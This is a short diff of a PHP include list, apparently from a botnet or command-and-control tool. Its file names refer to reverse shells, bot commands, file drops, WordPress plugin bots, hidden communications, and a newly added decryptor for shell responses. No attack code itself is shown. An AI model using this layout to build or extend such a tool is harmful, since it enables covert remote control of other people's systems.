@@ -9,7 +9,6 @@ include "lib/curlStuff/defaultClient/genericClientExecuteReverseShell.php";
 include "lib/curlStuff/validateMeMore/talkToMeDamnit.php";
 include "lib/curlStuff/mainCurl.php";
 //bots
-include "lib/bots/bot_cmds/doMyBidding.php";
 include "lib/bots/bot_esplode/mustRetreat.php";
 include "lib/bots/bot_files/hereEatThis.php";
 // make new bots
@@ -19,6 +18,7 @@ include "lib/new_bots/wordpressPlugins/makeMeWordPressing.php";
 include "lib/crypto/encryptMyComs/hideMyCommunication.php";
 include "lib/crypto/needSalt/missingSalt.php";
 include "lib/crypto/certMaker/certGenerator.php";
+include "lib/crypto/decryptShellResponses/decryptor.php";
 // config and menu + logo
 include "lib/config/defaultConfig.php";
 include "lib/logos/art/artisticStuff.php";
